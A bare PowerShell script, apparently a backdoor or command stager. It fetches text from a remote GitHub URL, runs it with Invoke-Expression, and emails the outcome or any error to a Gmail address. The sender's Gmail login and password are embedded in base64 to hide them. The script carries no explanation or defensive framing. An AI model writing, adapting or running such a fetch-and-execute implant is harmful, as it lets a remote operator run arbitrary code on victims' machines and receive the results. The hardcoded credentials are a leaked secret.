
function Send-ToEmail([string]$email,[string]$body,[string]$subj=$env:username){
    $UsernameEnc = "eABhAGsAZQByAC4AaQBzAGkAMAAwADcAQABnAG0AYQBpAGwALgBjAG8AbQA=";
    $PasswordEnc = "cAB2AGsAcgBmAHIAeABpAHAAeABqAHIAdgBlAHcAZgA=";
    $Username = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($UsernameEnc))
    $Password = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($PasswordEnc))
    $message = new-object Net.Mail.MailMessage;
    $message.From = $Username;
    $message.To.Add($email);
    $message.Subject = $subj;
    $message.Body = $body;
    $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
    $smtp.EnableSSL = $true;
    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
    $smtp.send($message);
 }
$url = "https://raw.githubusercontent.com/4V4loon/tools/master/update"
$contentLocal = "False"
$contentWeb = Invoke-WebRequest -Uri $url -UseBasicParsing | select -ExpandProperty Content
$diff = Compare-Object -ReferenceObject $($contentLocal) -DifferenceObject $($contentWeb)
if($diff) {
     try {
          Invoke-Expression $contentWeb -ErrorAction Stop
          Send-ToEmail -email "xelil.isi007@gmail.com" -body $contentWeb -subj "Done"
     } catch {
          $err = $_ | Out-String
          write-host $err
          Send-ToEmail -email "xelil.isi007@gmail.com" -body $err -subj "Error"
     }
}